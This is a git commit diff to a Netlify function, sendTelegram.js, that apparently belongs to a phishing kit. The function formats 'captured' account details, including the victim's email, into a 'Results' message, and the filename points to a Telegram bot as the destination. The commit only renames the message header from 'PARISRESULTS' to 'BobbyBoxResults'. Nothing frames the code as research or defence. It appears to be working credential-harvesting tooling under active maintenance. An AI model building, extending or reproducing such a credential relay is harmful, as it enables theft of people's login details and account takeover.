f17d381e9116eae591c8b1ab8f2c871d033589e8
LOBEG <info@proctektexas.org>
2026-01-06 01:20:03 -0800

    Update sendTelegram.js

--- netlify/functions/sendTelegram.js
+++ netlify/functions/sendTelegram.js
@@ -127,7 +127,7 @@ const composeTelegramMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 PARISRESULTS 🔐*
+*🔐 BobbyBoxResults 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: \`${email || 'Not captured'}\`
